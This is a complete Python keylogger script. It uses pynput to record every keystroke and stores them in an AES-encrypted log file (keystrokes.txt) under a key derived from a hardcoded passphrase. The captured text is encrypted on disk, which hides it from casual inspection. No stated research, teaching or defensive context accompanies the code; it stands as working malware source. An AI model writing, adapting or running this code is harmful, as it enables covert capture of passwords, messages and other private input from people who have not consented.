import os
import logging
from pynput import keyboard
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

log_file = "keystrokes.txt"

garbage = b"#$!k9zPqR7mN2vX"
salt = os.urandom(16)
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = kdf.derive(garbage)
nonce = os.urandom(16)
cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
encryptor = cipher.encryptor()
with open(log_file, "wb") as f:
    f.write(salt + nonce)
keystroke_buffer = ""

def flush_buffer():
    global encryptor, keystroke_buffer
    if keystroke_buffer:
        encrypted_data = encryptor.update(keystroke_buffer.encode())
        with open(log_file, "ab") as f:
            f.write(encrypted_data)
        keystroke_buffer = ""

def on_press(key):
    global keystroke_buffer
    try:
        if key in (keyboard.Key.shift_l, keyboard.Key.shift_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r):
            return
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
        elif key == keyboard.Key.backspace:
            if keystroke_buffer:
                keystroke_buffer = keystroke_buffer[:-1]
            return
        elif hasattr(key, 'char') and key.char is not None:
            char = key.char
        else:
            char = f"[{key.name.upper()}]"

        keystroke_buffer += char
        if len(keystroke_buffer) >= 10:
            flush_buffer()

    except Exception as e:
        logging.error(f"Error: {e}")

logging.basicConfig(filename='errors.log', level=logging.ERROR)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

flush_buffer()
final_data = encryptor.finalize()
with open(log_file, "ab") as f:
    f.write(final_data)